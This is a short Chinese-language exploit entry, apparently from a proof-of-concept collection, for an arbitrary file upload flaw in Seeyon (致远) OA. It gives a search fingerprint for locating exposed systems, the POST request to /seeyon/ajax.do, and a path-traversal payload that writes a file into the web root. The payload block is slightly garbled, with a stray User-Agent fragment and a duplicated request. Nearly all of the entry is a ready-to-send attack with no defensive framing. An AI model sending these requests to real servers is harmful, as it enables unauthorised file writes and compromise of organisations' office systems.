# 致远OAajax.do存在任意文件上传漏洞

- **系统**：致远OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="致远互联-OA"`
- **请求**：`POST /seeyon/ajax.do;JSESSIONID=chat?method=ajaxAction&managerName=fileToExcelManager&rnd=12700 HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
method=ajaxAction&managerName=fileToExcelManager&managerMethod=saveExcelInBase&arguments=["../webapps/ROOT/test123.txt","",{"columnName":['test123']}]
**上传定位：/test123.txt**
POST /seeyon/ajax.do;JSESSIONID=46790A1177FA85708C322A141D758E2E HTTP/1.1
Content-Type: application/x-www-form-urlencoded
method=ajaxAction&managerName=fileToExcelManager&managerMethod=saveExcelInBase&arguments=["../webapps/ROOT/test123.txt","",{"columnName":['test123']}]
**上传定位：/test123.txt**
```
- **预期**：200　|　—